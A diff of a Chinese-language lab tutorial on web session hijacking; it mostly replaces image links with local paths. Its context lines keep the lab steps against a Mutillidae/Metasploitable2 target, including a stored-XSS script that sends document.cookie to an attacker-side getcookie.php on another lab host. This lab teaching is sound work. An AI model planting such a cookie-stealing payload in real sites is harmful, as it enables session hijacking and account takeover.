@@ -50,7 +50,7 @@ session 的诞生是用户与服务器连上的时候，但关闭浏览器或者
 
 在 PHP 中对于 session 是这样的一个处理过程：
 
-![session-creat](https://doc.shiyanlou.com/document-uid113508labid2434timestamp1483086634421.png/wm)
+![session-creat](../imgs/wm_271.png)
 （此图来自于[DoDo's Blog](http://os.51cto.com/art/201204/328888.htm)）
 
 所以之前我们便是利用了 PHPSESSID 实现了中间人攻击，中间人攻击便是 Web session hijacking 实现的一种方式。
@@ -61,15 +61,15 @@ session 的诞生是用户与服务器连上的时候，但关闭浏览器或者
 
 在实验桌面中，双击 Xfce 终端，打开终端：
 
-![此处输入图片的描述](https://doc.shiyanlou.com/document-uid13labid2290timestamp1479374588595.png/wm)
+![此处输入图片的描述](../imgs/wm_272.png)
 
 使用 `sudo virsh start Metasploitable2` 命令即可启动我们的靶机系统虚拟机：
 
-![start-metasploit.png](https://doc.shiyanlou.com/document-uid113508labid2407timestamp1482139532596.png/wm)
+![start-metasploit.png](../imgs/wm_273.png)
 
 稍等片刻，待得虚拟机完全启动之后，我们使用 `ssh msfadmin@target` 登陆靶机系统：
 
-![homework-ssh](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231211681.png/wm)
+![homework-ssh](../imgs/wm_274.png)
 
 紧接着修改 Mutillidae 的连接数据库配置文件：
 
@@ -79,27 +79,27 @@ sudo vim /var/www/mutillidae/config.inc
 
 将文本中的 `$dbname = 'metasploit';` 修改为 `$dbname = 'owasp10';` 
 
-![homework-config.png](https://doc.shiyanlou.com/document-uid113508labid2409timestamp1482231222076.png/wm)
+![homework-config.png](../imgs/wm_275.png)
 
 紧接着我们打开桌面上的 Firefox：
 
-![open-firefox.png](https://doc.shiyanlou.com/document-uid113508labid2407timestamp1482139552463.png/wm)
+![open-firefox.png](../imgs/wm_276.png)
 
 访问我们的靶机系统所使用的 IP 地址`192.168.122.102`：
 
-![view-metasploit-url.png](https://doc.shiyanlou.com/document-uid113508labid2407timestamp1482139568548.png/wm)
+![view-metasploit-url.png](../imgs/wm_277.png)
 
 正常的启动靶机系统之后，可以得到上述页面，选择 mutillidae，我们可以登陆到这样一个页面：
 
-![show-mutillidae](https://doc.shiyanlou.com/document-uid113508labid2434timestamp1483086653246.png/wm)
+![show-mutillidae](../imgs/wm_278.png)
 
 我们可以登陆一个账户若是没有账户可以直接注册：
 
-![show-register](https://doc.shiyanlou.com/document-uid113508labid2434timestamp1483086661960.png/wm)
+![show-register](../imgs/wm_279.png)
 
 经过简单的注册，我们可以登陆上来了：
 
-![show-login](https://doc.shiyanlou.com/document-uid113508labid2434timestamp1483086682080.png/wm)
+![show-login](../imgs/wm_280.png)
 
 这次我们依然是利用存储型 XSS 来帮助我们获取 cookie。
 
@@ -129,7 +129,7 @@ header("Location: http://192.168.122.102/mutillidae");
 
 编写完成之后我们使用 `:wq` 保存并退出，紧接着我们在当前的文件夹中创建一个 cookie.txt 的文本文件，因为该目录的所属用户是 root，所以在这个 php 程序执行的时候是没有权限创建文件的，所以我们提前创建好，并使用 `chown www-data:www-data cookie.txt` 来改变该文件的所属者：
 
-![show-cookietxt](https://doc.shiyanlou.com/document-uid113508labid2434timestamp1483086803463.png/wm)
+![show-cookietxt](../imgs/wm_281.png)
 
 最后我们通过 `service apache2 start` 来启动 apache2，这样 php 程序才能够被访问。
 
@@ -137,7 +137,7 @@ header("Location: http://192.168.122.102/mutillidae");
 
 首先我们进入实验环境：
 
-![entry-pxss](https://doc.shiyanlou.com/document-uid113508labid2434timestamp1483086705465.png/wm)
+![entry-pxss](../imgs/wm_282.png)
 
 然后我们将这样一段 javascript 代码放入 blog 的输入框中：
 
@@ -145,13 +145,13 @@ header("Location: http://192.168.122.102/mutillidae");
 <SCRIPT>document.location='http://192.168.122.101/getcookie.php?remote_cookie='+document.cookie</SCRIPT>
 ```
 
-![entry-js](https://doc.shiyanlou.com/document-uid113508labid2434timestamp1483086712501.png/wm)
+![entry-js](../imgs/wm_283.png)
 
 点击 `Save Blog Entry` 之后我们会发现跳转到了 `192.168.122.102/mutillidae` 页面，说明我们已经注入成功。
 
 同时我们可以通过 `less cookie.txt`查看 kali 主机中的存储文件：
 
-![show-cookies](https://doc.shiyanlou.com/document-uid113508labid2434timestamp1483086727383.png/wm)
+![show-cookies](../imgs/wm_284.png)
 
 这就是我们刚刚登陆用户的 cookie，因为我们是使用的存储型 XSS，所以当我们再次访问刚才的页面，我们依然能够收到 cookie。
 
